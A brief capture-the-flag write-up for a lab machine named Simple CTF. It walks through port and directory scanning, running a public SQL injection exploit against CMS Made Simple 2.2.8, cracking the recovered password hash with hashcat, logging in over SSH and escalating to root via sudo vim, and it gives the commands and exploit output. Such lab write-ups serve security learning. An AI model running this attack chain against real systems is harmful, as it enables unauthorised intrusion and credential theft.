# Simple CTF
---
* It want to remind myself that I did it without any writeup :))))


* nmap finds 3 ports, 1 ftp which doesn't yeild anything interesing, 1 ssh and 1 web
* Running gobuster on the webpage, we find */simple* dir
```bash
$ gobuster dir -u http://10.10.154.169/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt | tee dir_scan
$ nmap -p- $IP
$ nmap -p 22,80,2222 -sV -sC $IP
```
* Searching for a vulnerability for *CMS Made Simple 2.2.8* we find one that exploits SQLi
```bash
$ searchsploit CMS Made Simple 2.2.8
$ searchsploit -m php/webapps/46635.py
```
The hash: *0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2*
```bash
$ python3 46635.py -u http://IP/simple/
$ hashcat -a 0 -m 20 hash /usr/share/wordlists/rockyou.txt
```
* The exploit gives us a password hash, which can easily be cracked with *hashcat* (password: secret)
```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
```
* The password can be used to connect to ssh on the higher port
```bash
$ ssh mitch@10.10.154.169 -p 2222
```

* Running *sudo -l* tells us that we can run *vim* with sudo privileges, so we can gain a root shell

